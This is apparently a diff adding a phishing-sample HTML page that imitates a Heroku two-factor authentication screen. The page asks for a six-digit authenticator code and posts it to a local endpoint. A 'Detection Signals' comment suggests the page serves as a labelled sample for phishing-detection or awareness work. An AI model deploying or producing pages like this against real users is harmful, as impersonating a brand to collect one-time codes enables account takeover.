@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Heroku - Authentication</title>
+    <style>
+        body { font-family: 'Salesforce Sans', sans-serif; background: #f7f7fc; margin: 0; padding: 20px; }
+        .heroku-container { max-width: 460px; margin: 50px auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); padding: 40px; }
+        .heroku-logo { text-align: center; margin-bottom: 30px; font-size: 30px; font-weight: 700; color: #430098; }
+        .heroku-title { color: #2c2f33; font-size: 24px; margin-bottom: 12px; font-weight: 600; }
+        .heroku-text { color: #6b6b76; line-height: 1.7; margin-bottom: 25px; }
+        .heroku-form-group { margin-bottom: 20px; }
+        .heroku-label { display: block; color: #2c2f33; margin-bottom: 8px; font-weight: 600; font-size: 14px; }
+        .heroku-input { width: 100%; padding: 12px; border: 1px solid #d6d6de; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+        .heroku-input:focus { border-color: #430098; outline: none; box-shadow: 0 0 0 3px rgba(67, 0, 152, 0.1); }
+        .heroku-button { width: 100%; padding: 14px; background: #430098; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .heroku-button:hover { background: #360079; }
+    </style>
+</head>
+<body>
+    <!-- Detection Signals: Tech domain: heroku, cloud platform -->
+    <div class="heroku-container">
+        <div class="heroku-logo">heroku</div>
+        <h1 class="heroku-title">Authentication Required</h1>
+        <p class="heroku-text">Enter the verification code from your authenticator app.</p>
+        <form id="authForm" action="/auth/verify" method="POST">
+            <div class="heroku-form-group">
+                <label for="authCode" class="heroku-label">Verification Code</label>
+                <input type="tel" id="authCode" name="auth_code" class="heroku-input" placeholder="000000" maxlength="6" pattern="[0-9]{6}" inputmode="numeric" autocomplete="one-time-code" required />
+            </div>
+            <button type="submit" class="heroku-button">Verify</button>
+        </form>
+    </div>
+</body>
+</html>
